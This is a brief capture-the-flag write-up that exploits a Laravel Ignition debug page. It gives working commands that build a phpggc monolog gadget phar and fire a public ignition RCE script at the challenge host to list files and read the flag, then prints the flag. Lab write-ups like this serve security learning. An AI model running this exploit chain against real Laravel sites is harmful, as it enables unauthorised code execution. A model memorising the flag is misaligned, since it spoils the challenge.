Challenge desc mentioned a debug page, so lets find it

Sending a post request we find that the site uses ignition a fancy laravel error page
```html
<form method="POST"><input type=submit></form>
```

Search for an RCE

https://github.com/ambionics/laravel-exploits

Load up the RCE to ls then get the flag
```
php -d'phar.readonly=0' ./phpggc/phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system "ls /"
python3 laravel-ignition-rce.py http://188.166.156.174:32211/ /tmp/exploit.phar


php -d'phar.readonly=0' ./phpggc/phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system "cat /flagrzgWA"
python3 laravel-ignition-rce.py http://188.166.156.174:32211/ /tmp/exploit.phar
```

CHTB{wh3n_7h3_d3bu663r_7urn5_4641n57_7h3_d3bu6633}
